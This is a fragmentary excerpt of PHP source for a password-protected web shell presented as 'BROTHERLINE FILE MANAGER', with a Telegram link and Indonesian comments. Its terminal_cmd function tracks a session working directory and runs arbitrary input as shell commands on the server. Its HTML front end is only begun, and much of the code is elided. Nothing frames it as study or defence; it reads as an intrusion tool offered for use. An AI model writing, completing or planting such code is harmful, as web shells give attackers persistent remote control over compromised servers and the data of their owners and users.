...
$hashed_password = '$2a$12$MB2.i8NYfpskVNaOvWMuxOCVZFFHRRUgmdYrh0jGRy1witFdrKwdC';
...
function terminal_cmd($in, $re = false) {
    ...
    // 2. Tangani perintah 'cd' secara manual untuk mengubah isi Sesi
    if (preg_match('/^\s*cd\s+(.+)$/', $in, $m)) {
        $target = trim($m[1]);
        
        // Tangani path relatif dan absolut
        $orig = getcwd();
        chdir($_SESSION['cwd']); // Pindah ke posisi terakhir dulu
        
        if (@chdir($target)) {
            $_SESSION['cwd'] = getcwd(); // Simpan posisi baru
            chdir($orig); // Kembalikan ke direktori skrip
    ...
    // 3. Jalankan perintah non-cd
    $orig = getcwd();
    chdir($_SESSION['cwd']); // Eksekusi perintah di direktori target sesi
    
    $out = null;
    $cmd = $in . ($re ? " 2>&1" : " 2>&1"); // Gabungkan error output agar terlihat
    ...
    chdir($orig); // Selalu kembalikan ke awal skrip agar PHP tidak error
...
<html lang="en" data-theme="light">
    ...
    <body>
        <div class="app">
            ...
            <div class="titlebar">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#0078d4"><path d="M3 3h8v8H3zm10 0h8v8h-8zM3 13h8v8H3zm10 0h8v8h-8z"/></svg>
                <span class="titlebar-title">BROTHERLINE FILE MANAGER | t.me/brothercloudsline |</span>
